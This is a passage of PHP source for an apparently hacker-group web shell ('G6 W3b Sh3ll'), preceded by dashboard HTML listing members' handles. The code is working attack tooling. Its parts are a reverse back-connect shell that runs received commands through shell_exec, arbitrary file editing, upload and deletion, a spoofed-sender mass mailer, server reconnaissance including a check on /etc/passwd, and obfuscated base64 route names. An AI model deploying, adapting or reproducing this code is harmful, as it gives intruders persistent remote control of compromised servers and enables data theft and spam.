			                <i class="read"></i>
			                <img class="avatar" src="images/photo03.jpg" alt="avatar">
			                <p class="sender">51NCH1</p>
			                <p class="message"><strong>New Mac :D</strong> - So happy with ...</p>
			                <div class="actions">
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/undo.png" alt="reply"></a>
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/star_fav.png" alt="favourite"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/tag.png" alt="label"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/trash.png" alt="delete"></a>
			                </div>
			            </li>
			            <li>
			                <i class="read"></i>
			                <img class="avatar" src="images/photo03.jpg" alt="avatar">
			                <p class="sender">DEM~</p>
			                <p class="message"><strong>New Mac :D</strong> - So happy with ...</p>
			                <div class="actions">
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/undo.png" alt="reply"></a>
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/star_fav.png" alt="favourite"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/tag.png" alt="label"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/trash.png" alt="delete"></a>
			                </div>
			            </li>
			            <li>
			                <i class="read"></i>
			                <img class="avatar" src="images/photo03.jpg" alt="avatar">
			                <p class="sender">./Dark_Quinzel</p>
			                <p class="message"><strong>New Mac :D</strong> - So happy with ...</p>
			                <div class="actions">
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/undo.png" alt="reply"></a>
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/star_fav.png" alt="favourite"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/tag.png" alt="label"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/trash.png" alt="delete"></a>
			                </div>
			            </li>
			            <li>
			                <i class="read"></i>
			                <img class="avatar" src="images/photo03.jpg" alt="avatar">
			                <p class="sender">Epraizer</p>
			                <p class="message"><strong>New Mac :D</strong> - So happy with ...</p>
			                <div class="actions">
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/undo.png" alt="reply"></a>
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/star_fav.png" alt="favourite"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/tag.png" alt="label"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/trash.png" alt="delete"></a>
			                </div>
			            </li>
			            <li>
			                <i class="read"></i>
			                <img class="avatar" src="images/photo03.jpg" alt="avatar">
			                <p class="sender">Alone_Programmer</p>
			                <p class="message"><strong>New Mac :D</strong> - So happy with ...</p>
			                <div class="actions">
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/undo.png" alt="reply"></a>
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/star_fav.png" alt="favourite"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/tag.png" alt="label"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/trash.png" alt="delete"></a>
			                </div>
			            </li>
			            			            <li>
			                <i class="read"></i>
			                <img class="avatar" src="images/photo03.jpg" alt="avatar">
			                <p class="sender">Mr.Andraz404</p>
			                <p class="message"><strong>New Mac :D</strong> - So happy with ...</p>
			                <div class="actions">
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/undo.png" alt="reply"></a>
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/star_fav.png" alt="favourite"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/tag.png" alt="label"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/trash.png" alt="delete"></a>
			                </div>
			            </li>
			            <li>
			                <i class="read"></i>
			                <img class="avatar" src="images/photo03.jpg" alt="avatar">
			                <p class="sender">Mr.4600</p>
			                <p class="message"><strong>New Mac :D</strong> - So happy with ...</p>
			                <div class="actions">
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/undo.png" alt="reply"></a>
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/star_fav.png" alt="favourite"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/tag.png" alt="label"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/trash.png" alt="delete"></a>
			                </div>
			            </li>
			        	<li>
			                <i class="read"></i>
			                <img class="avatar" src="images/photo03.jpg" alt="avatar">
			                <p class="sender">TU5UK S4T3</p>
			                <p class="message"><strong>New Mac :D</strong> - So happy with ...</p>
			                <div class="actions">
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/undo.png" alt="reply"></a>
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/star_fav.png" alt="favourite"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/tag.png" alt="label"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/trash.png" alt="delete"></a>
			                </div>
			            </li>
			            <li>
			                <i class="read"></i>
			                <img class="avatar" src="images/photo03.jpg" alt="avatar">
			                <p class="sender">MR.DevillXBlues</p>
			                <p class="message"><strong>New Mac :D</strong> - So happy with ...</p>
			                <div class="actions">
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/undo.png" alt="reply"></a>
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/star_fav.png" alt="favourite"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/tag.png" alt="label"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/trash.png" alt="delete"></a>
			                </div>
			            </li>
			            <li>
			                <i class="read"></i>
			                <img class="avatar" src="images/photo03.jpg" alt="avatar">
			                <p class="sender">Mr.spongebob</p>
			                <p class="message"><strong>New Mac :D</strong> - So happy with ...</p>
			                <div class="actions">
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/undo.png" alt="reply"></a>
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/star_fav.png" alt="favourite"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/tag.png" alt="label"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/trash.png" alt="delete"></a>
			                </div>
			            </li>
			            <li>
			                <i class="read"></i>
			                <img class="avatar" src="images/photo03.jpg" alt="avatar">
			                <p class="sender">Rinto AR</p>
			                <p class="message"><strong>New Mac :D</strong> - So happy with ...</p>
			                <div class="actions">
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/undo.png" alt="reply"></a>
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/star_fav.png" alt="favourite"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/tag.png" alt="label"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/trash.png" alt="delete"></a>
			                </div>
			            </li>
			            <li>
			                <i class="read"></i>
			                <img class="avatar" src="images/photo03.jpg" alt="avatar">
			                <p class="sender">./Mr.TraID</p>
			                <p class="message"><strong>New Mac :D</strong> - So happy with ...</p>
			                <div class="actions">
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/undo.png" alt="reply"></a>
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/star_fav.png" alt="favourite"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/tag.png" alt="label"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/trash.png" alt="delete"></a>
			                </div>
			            </li>
			            <li>
			                <i class="read"></i>
			                <img class="avatar" src="images/photo03.jpg" alt="avatar">
			                <p class="sender">Mrs.Mustache</p>
			                <p class="message"><strong>New Mac :D</strong> - So happy with ...</p>
			                <div class="actions">
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/undo.png" alt="reply"></a>
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/star_fav.png" alt="favourite"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/tag.png" alt="label"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/trash.png" alt="delete"></a>
			                </div>
			            </li>		            
			            <li>
			                <i class="read"></i>
			                <img class="avatar" src="images/photo03.jpg" alt="avatar">
			                <p class="sender">z3r00_c00d3r</p>
			                <p class="message"><strong>New Mac :D</strong> - So happy with ...</p>
			                <div class="actions">
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/undo.png" alt="reply"></a>
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/star_fav.png" alt="favourite"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/tag.png" alt="label"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/trash.png" alt="delete"></a>
			                </div>
			            </li>
			            <li>
			                <i class="read"></i>
			                <img class="avatar" src="images/photo03.jpg" alt="avatar">
			                <p class="sender">Cyb3r001</p>
			                <p class="message"><strong>New Mac :D</strong> - So happy with ...</p>
			                <div class="actions">
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/undo.png" alt="reply"></a>
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/star_fav.png" alt="favourite"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/tag.png" alt="label"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/trash.png" alt="delete"></a>
			                </div>
			            </li>			            
			            <li>
			                <i class="read"></i>
			                <img class="avatar" src="images/photo04.jpg" alt="avatar">
			                <p class="sender">Peter B.</p>
			                <p class="message"><strong>Thank you</strong> - Finally I can ...</p>
			                <div class="actions">
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/undo.png" alt="reply"></a>
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/star_fav.png" alt="favourite"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/tag.png" alt="label"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/trash.png" alt="delete"></a>
			                </div>
			            </li>
			        </ul>
    			</div>
			</div>
		</div><!-- /dash-unit -->
    </div><!-- /span3 -->

	  <!-- GRAPH CHART - lineandbars.js file -->     
        <div class="col-sm-6 col-lg-6">
      		<div class="dash-unit">
      		<dtitle>Other Information</dtitle>
      		<hr>
			    <b>Blog : </b><a href="www.cyruscyberid.tk"> www.cyruscyberid.tk </a><br>			    
			    <b>Facebook Grups : </b><a href="https://www.facebook.com/groups/1103786453034738/">[+] Cyrus_Cybers [+] Show off Zone</a><br>
			    <b>Facebook Pages : </b><a href="https://www.facebook.com/Cyrus-Cybers-Indonesian-security-1655373978120224/">Cyrus Cybers Indonesian security</a><br>
			    <b>Irc : </b> none<br>
			    <b>Creator Shell:</b> KAZE-T a.k.a Fahriansyah
			</div>
        </div>

	
	  <!-- 30 DAYS STATS - CAROUSEL FLEXSLIDER -->     
        <div class="col-sm-3 col-lg-3">
      		<div class="dash-unit">
	      		<dtitle>Last Stats</dtitle>
	      		<hr>
	      		<br>
	      		<br>
	            <div class="flexslider">
					<ul class="slides">
						<li><img src="images/slide01.png" alt="slider"></li>
						<li><img src="images/slide02.png" alt="slider"></li>
					</ul>
            </div>
				<div class="cont">
					<p>StatCounter Information</p>
				</div>   
			</div>
        </div>
      </div><!-- /row -->
     
 

		</div><!--/row -->
     
      
      
	</div>
          ';
}
function get_srv_info(){

}

function cmd(){
	$disabled = explode(', ', ini_get('disable_functions'));
	$diabledLower = array();
	foreach($diabled as $function){$diabledLower[] = strtolower($function);}
	if(!in_array($diabledLower, "exec")){return "exec";	}elseif(!in_array($diabledLower, "passthru")){return "passthru";}elseif(!in_array($diabledLower, "system")){return "system";}else{return "none";}}
	$shellVersion = "1.1";

$upload = $_GET['dXBsb2Fk'];
$downloadfilename = $_GET['ZG93bg'];
$delete = $_GET['delete'];
$file_explorer = $_GET['ZmlsZV9leHBsb3Jlcg'];
$mkdir = $_GET['bWtkaXI'];
$currentDirectoryFileDl = $_GET['downlfile'];
$NavLinks = array(
	array(
		"name" => "Main",
		"url" => "?"
	),
	array(
		"name" => "Server Information",
		"url" => "?c3J2aW5mbw="
	),
	array(
		"name" => "File Explorer",
		"url" => "?ZmlsZV9leHBsb3Jlcg=".dirname(__FILE__)."/"
	),
	array(
		"name" => "Terminal",
		"url" => "?dGVybWlhbmw"
	),
	array(
		"name" => "Hash Identifier",
		"url" => "?aGk="
	),
	array(
		"name" => "PHP Exec",
		"url" => "?eval"
	),
	array(
		"name" => "Back Connect",
		"url" => "?YmNrbmV0="
	),
	array(
		"name" => "Mass Mailer",
		"url" => "?kueqymass"
	),
	array(
		"name" => "Shell-101",
		"url" => "?a253aXN1ZQ"
	),
	array(
		"name" => "Self Remove",
		"url" => "?srmve"
	)
);
$CurrentUrl = "http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
$last = count($NavLinks) - 1;
foreach($NavLinks as $NavLink => $NavRow){
	$linknames = ($NavLink == 0);
    $linkurls = ($NavLink == $last);
	echo '<a href="'.$NavRow['url'].'">'.$NavRow['name'].'</a> / ';
}
if(strstr($CurrentUrl, "readfile")){
		$sourcefile = $_REQUEST['readfile'];
   		if(is_file($sourcefile)){
        get_srv_info();
        if(isset($sourcefile))
        {
            $Finalsource = file_get_contents($sourcefile);		

		echo "<strong>Editing: </strong>".$sourcefile."<br /><br /><a href='".$_SERVER['HTTP_REFERER']."'>&laquo; Back to files</a><br /><form action='' method='POST'><textarea name='sourcecode' class='viewsource' rows='20' cols='121' style='height:500px;'>".htmlentities($Finalsource)."</textarea><br /><input type='Submit' value='Save File' name='save' /></form>";
		}
		}else{
			echo "Data not sent.";
		}
		if(isset($_POST['save'])){
			$new_source = $_POST['sourcecode'];
			$source_edit = fopen($sourcefile, 'w');
			fwrite($source_edit, $new_source);
			fclose($source_edit);
		}
}elseif(strstr($CurrentUrl, "aGk")){
	get_srv_info();
	echo "<p>G6 hash identifier is able to identify MD5, SHA-1, MySQL5, DES(Unix), SHA-256, SHA-384, SHA-512, MD5(Unix), MD5(APR), MD5(phpBB3), MD5(Wordpress), SHA-256(Unix), SHA-512(Unix) and MD5(Base-64).</p>";
	if(isset($_POST['gethash'])){
		$hash = $_POST['hash'];
		if(strlen($hash)==32){
			$hashresult == "MD5 Hash";
		}elseif(strlen($hash)==40){
			$hashresult = "SHA-1 Hash/ /MySQL5 Hash";
		}elseif(strlen($hash)==13){
			$hashresult = "DES(Unix) Hash";
		}elseif(strlen($hash)==16){
			$hashresult = "MySQL Hash / /DES(Oracle Hash)";
		}elseif(strlen($hash)==41){
			$GetHashChar = substr($hash, 40);
			if($GetHashChar == "*"){
				$hashresult = "MySQL5 Hash"; 
			}	
		}elseif(strlen($hash)==64){
			$hashresult = "SHA-256 Hash";
		}elseif(strlen($hash)==96){
			$hashresult = "SHA-384 Hash";
		}elseif(strlen($hash)==128){
			$hashresult = "SHA-512 Hash";
		}elseif(strlen($hash)==34){
			if(strstr($hash, '$1$')){
				$hashresult = "MD5(Unix) Hash";
			} 	
		}elseif(strlen($hash)==37){
			if(strstr($hash, '$apr1$')){
				$hashresult = "MD5(APR) Hash";
			} 	
		}elseif(strlen($hash)==34){
			if(strstr($hash, '$H$')){
				$hashresult = "MD5(phpBB3) Hash";
			} 	
		}elseif(strlen($hash)==34){
			if(strstr($hash, '$P$')){
				$hashresult = "MD5(Wordpress) Hash";
			} 	
		}elseif(strlen($hash)==39){
			if(strstr($hash, '$5$')){
				$hashresult = "SHA-256(Unix) Hash";
			} 	
		}elseif(strlen($hash)==39){
			if(strstr($hash, '$6$')){
				$hashresult = "SHA-512(Unix) Hash";
			} 	
		}elseif(strlen($hash)==24){
			if(strstr($hash, '==')){
				$hashresult = "MD5(Base-64) Hash";
			} 	
		}else{
			$hashresult = "Hash type not found";
		}
	}else{
		$hashresult = "Not Hash Entered";
	}
	?>
	<center>
	<div class="dash-unit">
	<dtitle><h2>Hash Identifer</h2></dtitle><hr>
		<form action="" method="POST"><table><tr class="optionstr"><td>Enter Hash:&nbsp;&nbsp;&nbsp;</td>	<td>&nbsp;&nbsp;&nbsp;<input type="text" name="hash" class="command" /></td><td>&nbsp;&nbsp;<input type="submit" name="gethash" value="Identify Hash" /></td></tr><tr class="optionstr"><td>Result: </td><td><?php echo $hashresult; ?></td></tr></table></form></div>
	</center>
	
	<?php

}elseif(strstr($CurrentUrl, "YmNrbmV0")){
	get_srv_info();
	echo '
<div class="dash-unit">
<div id="back">
            <dtitle><h2>Back Connect</h2></dtitle><hr>
            <p align="center">Back connect will allow you to enter system commands remotely.</p>
            <p align="center"><center>
            <table>
				<form action="" method="post">
				<tr class="optionstr"><td>IP Address: </td><td><input type="textbox" name="ip" style="border:1px solid #ffffff; color: #a1afa5;background-color:#707070;font-size:13px;"></td></tr>
				<tr class="optionstr"><td>Port: </td><td><input type="textbox" name="port" style="border:1px solid #ffffff; color: #5C7296;background-color:#707070;font-size:13px;"></td></tr>
				<tr class="optionstr"><td><input type="submit" name="bind" value="Open Connection" ></td></tr>
				</form>
				</table></center></div>';
				if(isset($_POST['bind']))
					{
						echo "<p>Attempting Connection...</p>";
						$ip = $_POST['ip'];
						$port= $_POST['port'];
						$sockfd=fsockopen($ip , $port , $errno, $errstr );
						if($errno != 0){echo "<font color='red'><b>$errno</b> : $errstr</font>";}else if (!$sockfd)	{$result = "<p>Unexpected error has occured, connection may have failed.</p>";}	else {fputs ($sockfd ,"\n{################################################################}\n..:: G6 W3b Sh3ll v1.1- Coded By Mr. P-teo ::..\n\n=> Backconnect \n=> Back	\n
							 \n{################################################################}"); $pwd = shell_exec("pwd"); $sysinfo = shell_exec("uname -a"); $time = Shell_exec("time"); $len = 1337; fputs($sockfd, "User ", $sysinfo, "connected @ ", $time, "\n\n"); while(!feof($sockfd)){ $cmdPrompt = '[G6]#:> ';fputs ($sockfd , $cmdPrompt );$command= fgets($sockfd, $len);
							fputs($sockfd , "\n" . shell_exec($command) . "\n\n"); } fclose($sockfd);}}
		echo "</p></div>";

}elseif(strstr($CurrentUrl, "bWtmbA")){
	get_srv_info();
	echo "<p>If no file path is included it will be created within the same directory as the shell.</p><form action='' method='post'><p>Filename: <input type='text' name='newfilename' /></p><p><input type='submit' value='Create File' name='create' /></p></form>";
		$newfilename = htmlentities($_POST['newfilename']);
	if(isset($_POST['create'])){$ourFileName = $newfilename;$ourFileHandle = fopen($ourFileName, 'w') or die("can't open file");fclose($ourFileHandle);}
	echo "<br /><br />";
}elseif(strstr($CurrentUrl, "bWtkaXI")){
	get_srv_info();
	echo "<p>If no file path is included directory will be created within the same directory as the shell.</p>
		<form action='' method='post'>
		<p>Directory Name: <input type='text' name='newdirname' /></p>
		<p><input type='submit' value='Create New Directory' name='createdir' /></p>
		</form>";
	$newdirname = htmlentities($_POST['newdirname']);
	if(isset($_POST['createdir'])){
		$ourdirName = $newdirname;
		mkdir($ourdirName, 0777);
		echo "Directory Created!";
	}
	echo "
		<br /><br />";
}elseif(strstr($CurrentUrl, "ZmlsZV9leHBsb3Jlcg")){
		get_srv_info();
		$upload = $file_explorer;
		echo '<center><div style="color:#ffffff;"><br /><p><form action="" method="POST"><table><tr class="optionstr"><td><input class="chdir" type="text" name="chdir" value="'.$file_explorer.'"" /></td><td></td></form><td><div id="options"><a href="'.$CurrentUrl.'">&nbsp;Refresh Files</a></div></td><td><div id="options"><!--<a href="?bWtkaXI='.$file_explorer.'">Make Directory</a> | <a href="?bWtmbA='.$file_explorer.'">Make File</a> | <a href="?dXBsb2Fk='.$upload.'">Upload</a></div>--></td></tr></div>';
		if(isset($_POST['godir'])){$mandircha = $_POST['chdir'];if($mandircha){	header("Location: ?ZmlsZV9leHBsb3Jlcg=".$_POST['chdir']);}}
	?>
	</div></p>
			<table class="FileBrowserTable"><tr><td class="TableHeader_Name"> FileName's</td><td class="TableHeader">Filetype</a></td><td class="TableHeader">Size</td><td class="TableHeader">Permisions</td><td class="TableHeader">Last Modified</td><td class="TableHeaderoptions"> Options</td></tr>
		<?php

		$Shell_Directory = $_SERVER['REMOTE_DIR'];
			//load files...		

		function GetFileType($file){
			if(!is_dir($file)){
				if(strstr($file, ".")){
					$FileExt = end(explode(".", $file));
					return $FileExt;
				}else{
					return "Directory";
				}
			}else{
				$Directory = "Directory";
				return $Directory;
			}
		}

		


function GetFileSize($file){
	if(!is_dir($file))
		return round(filesize($file) / 1024, 2) . " Kb";
	else
		return "Not Availible";
}

function LastModified($file){
		return  "<center>".date("m/d/y", filemtime($file))."</center>";
}

function permissions($file){
	if(is_readable($file)){
		$readable = "r";
	}else{
		$readable = "?";
	}
	if(is_writable($file)){
		$writable = "w";
	}else{
		$writable = "?";
	}
	if(is_executable($file)){
		$executable = "x";
	}else{
		$executable = "?";
	}


if($readable."--".$writable."--".$executable == "r--w--x"){
	return "<center style='color:#f1f1f1;'>".$readable."--".$writable."--".$executable."</center>";
}else{
	return "<center>".$readable."--".$writable."--".$executable."</center>";
}
}

		$Files = scandir($file_explorer);
	foreach($Files as $File){
		if($File == ".."){
			$currentDirectory = $_GET['ZmlsZV9leHBsb3Jlcg'];
			//Up a directory
			$currentDirectory = substr($currentDirectory, 0, strrpos($currentDirectory, "/"));
			echo "<tr><td><a href='?ZmlsZV9leHBsb3Jlcg=" .$currentDirectory. "'>" . $File . "</a></td><td></td><td></td><td></td><td></td><td></td></tr>";

		}elseif($File == "."){
			//Same as current Dir, no need for this...

		}else{
			$currentDirectory = $_GET['ZmlsZV9leHBsb3Jlcg'];
			$type = GetFileType($currentDirectory. "/" .$File);
			if($type == "Directory"){
				echo "<tr><td><a class='flink' title='Explore Directory' href='?ZmlsZV9leHBsb3Jlcg=" .$currentDirectory. "/" .$File. "'>" . $File . "/</a></td><td><center>" . $type . "</center></td><td class='filesize'>" . GetFileSize($currentDirectory. "/" .$File) . "</td><td style='color:red;'>".permissions($currentDirectory. "/" .$File)."</td><td>" . LastModified($currentDirectory. "/" .$File) . "</td><td>Not Availible</td></tr>";
			}else{
				echo "<tr><td><a class='flink' title='Edit File' href='?readfile=" .$currentDirectory. "/" .$File. "'>" . $File . "</a></td><td><center>" . $type . "</center></td><td class='filesize'>" . GetFileSize($currentDirectory. "/" .$File) . "</td><td style='color:red;'>".permissions($currentDirectory. "/" .$File)."</td><td>" . LastModified($currentDirectory. "/" .$File) . "</td><td><a href='?readfile=" .$currentDirectory. "/" .$File. "' title='Edit File'>E</a> - <a href='?delete=" .$currentDirectory. "/" .$File. "' title='Bin the Document'>B</a> - <a href='?downlfile=".$currentDirectory. "/" .$File."&file=".$File."' title='Download File'>D</a></td></tr>";
			}
		}
	}
		
?>
</table>
<div class="container">
<center><div style="background:#282828;border-bottom-right-radius:4px;-moz-border-bottom-right-radius:4px;-webkit-border-bottom-right-radius:4px;border-bottom-left-radius:4px;-moz-border-bottom-left-radius:4px;-webkit-border-bottom-left-radius:4px;height:25px;margin:0px 0px 10px 0px;width:1000px;" ></div>
	<div style="padding:10px;background-color: #292929;border: 1px solid #3467BA;border-radius: 6px;-moz-border-radius: 6px;-webkit-border-radius: 6px;width:220px;float:left;margin:10px 10px 15px 0px;">
	<h4>File Upload</h4><form action="" method="post" enctype="multipart/form-data"><input type="file" name="file" /><br /><input type="submit" name="upload" value="Upload File" /></form></div>
	<?php
	if(isset($_POST['upload'])){if(isset($_FILES['file'])){	move_uploaded_file($_FILES["file"]["tmp_name"], $file_explorer."/". $_FILES["file"]["name"]);echo '<script>alert("File successfully uploaded, enjoy.");</script>';}	}
	?>
	<div style="padding:10px;background-color: #292929;border: 1px solid #3467BA;border-radius: 6px;-moz-border-radius: 6px;-webkit-border-radius: 6px;width:220px;float:left;margin:10px 10px 15px 0px;">
	<h4>Create Directory</h4>
	<form action="" method="post"><input type="text" name="dirname" /><br /><input type="submit" name="createdir" value="Create Dir" /></form></div>
	<?php
		if(isset($_POST['createdir'])){if(strlen($_POST['dirname']) > 0){mkdir($file_explorer."/".$_POST['dirname'], 777) or die($file_explorer."/".$_POST['dirname']);}}
	?>
		<br /><br /><br /></center></div>
<?php

		
}elseif(strstr($CurrentUrl, "downlfile")){
			/*$type = mime_content_type($currentDirectoryFileDl);
			header('Content-Type: '.$type);
			header('Content-Disposition: attachment; filename="'.$currentDirectoryFileDl.'"');*/
			$file = $_GET['file'];
			// header('Content-Type: application/force-download'); Non-standard MIME-Type, incompatible with Samsung C3050 for example. Let it commented
			//readfile($currentDirectoryFileDl);
			forceDL($currentDirectoryFileDl, $file);
			/*
	 * forceDL
	 * 
	 * Forces the browser to download file
	 * 
	 * @param string $filePath Path to the selected download
	 * @param string $fileName Name of file to be saved, can be anything honestly
	 */
	function forceDL($filePath, $fileName) {
		/* Rquired for IE */
		if(ini_get('zlib.output_compression')) { ini_set('zlib.output_compression', 'Off');  }
		
		/*
		Files not downloading with correct headers?
		1) Open file in Notepad++ (or similar) and check for white-space or other code (php code)
		2) Extra code?
		3) Problem found.
		4) Profit
		Should answer most questions
		*/
		
		/* Headers */
		header('Pragma: public');
		header('Expires: 0');
		header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
		header('Last-Modified: ' . gmdate('D, d M Y H:i:s', filemtime($filePath)).' GMT');
		header('Cache-Control: private', false);
		header('Content-Type: application/force-download');
		header('Content-disposition: attachment; filename="' . $fileName . '"');
		header('Content-Transfer-Encoding: binary');
		header('Content-length: ' . filesize($filePath));
		readfile($filePath);
		echo $filePath.$fileName;
		exit();
	}

}elseif(strstr($CurrentUrl, "kueqymass")){
	get_srv_info();
	?>
	<div class="dash-unit">
		<strong>Mass Mailer</strong>
		<p>Be warned using the mass mailing feature may attract attention to your G6 shell. Seperate each email with <strong>;</strong></p>
		<form action="" method="post">
			<table><tr><td>To Email(s): </td><td><input type="text" style="background-color:#707070;color:#ffffff;border:1px solid #ffffff;outline:none;font-size:14px;border-radius:3px;-moz-border-radius:3px;-webkit-border-radius:3px;padding:2px 3px;margin:0 0 0 -1px; width:220px;" name="email" placeholder="email@address.com" /></tr><tr><td>Subject: </td>	<td><input type="text" style="background-color:#707070;color:#ffffff;border:1px solid #ffffff;outline:none;font-size:14px;border-radius:3px;-moz-border-radius:3px;-webkit-border-radius:3px;padding:2px 3px;margin:0 0 0 -1px; width:220px;" name="subject" /></td></tr><tr><td>From Email: </td><td><input type="email" style="background-color:#707070;color:#ffffff;border:1px solid #ffffff;outline:none;font-size:14px;border-radius:3px;-moz-border-radius:3px;-webkit-border-radius:3px;padding:2px 3px;margin:0 0 0 -1px; width:220px;" name="fromEmail" placeholder="example@google.com" /></td></tr><tr><td>Message: </td><td></td></tr></table><table><tr><td><textarea style="background-color:#707070;color:#ffffff;border:1px solid #ffffff;outline:none;font-size:14px;border-radius:3px;-moz-border-radius:3px;-webkit-border-radius:3px;padding:2px 3px;margin:0 0 0 -1px; width:220px;" name="message"></textarea></td></tr><tr><td><input type="submit" name="send" value="Send Message(s)" /></td></tr></table></form>
			<?php
	if(isset($_POST['send'])){ $email = $_POST['email'];$subject = $_POST['subject'];$from = $_POST['fromEmail'];$message = $_POST['message'];if($email&&$subject&&$from&&$message){$emails = explode(";", $email);foreach($emails as $email){mail($email, $subject, $message, "From: ".$from);	}}}
}elseif(strstr($CurrentUrl, "delete")){
	if(!is_dir($delete)){unlink($delete);}else{rmdir($delete);}
		header("Location: ".$_SERVER['HTTP_REFERER']);
}elseif(strstr($CurrentUrl, "c3J2aW5mbw")){
	get_srv_info();
  $s_safemode = ini_get("safe_mode");
  if($s_safemode = TRUE){$s_safemode = "<span class='enabled'>[ON";}else{$s_safemode = "<span class='disabled'>[OFF"; }
  if(extension_loaded('curl')){$curls="<span class='enabled'>[ON]</span>";}else{$curls="<span class='disabled'>[OFF]</span>";}
	echo "<b>Server Port: </b>".$_SERVER['SERVER_PORT']."<br /><br /><b>HTTP Connection: </b>".$_SERVER['HTTP_CONNECTION']."<br /><br /><b>Operating System:</b> ".php_uname()."<br /><br />";
	if(get_magic_quotes_gpc()){echo "<b>Magic Quotes:</b> <span class='enabled'>[ENABLED]</span><br /><br />";}else{echo "<b>Magic Quotes:</b> <span class='disabled'>[DISABLED]</span><br /><br />";}
	echo "<b>PHP Version:</b> ".phpversion()."<br /><br /><b>Safe Mode: </b>".$s_safemode."]</span><br /><br /><b>Curl: </b>".$curls."<br /><br /><b>Accept Encoding: </b> ".$_SERVER['HTTP_ACCEPT_ENCODING']."<br /><br /><b>Admin: </b>".$_SERVER['SERVER_ADMIN']."<br /><br /><strong>Disabled Functions: </strong>";
	if(!empty($disabled)){
	foreach($disabled as $functionsdis){
		echo $functionsdis.", ";
	}
	}else{
		echo "none";
	}
	echo "<br /><br /><strong>/etc/passwd: </strong>";
	if(is_readable("/home/etc/passwd")){
		echo "<span style='color:green;'>Readable</span>";
	}else{
		echo "<span style='color:red;'>Unreadable</span>";
	}
}elseif(strstr($CurrentUrl, "dGVybWlhbmw")){
	
	get_srv_info();
	?><center><br /><br />
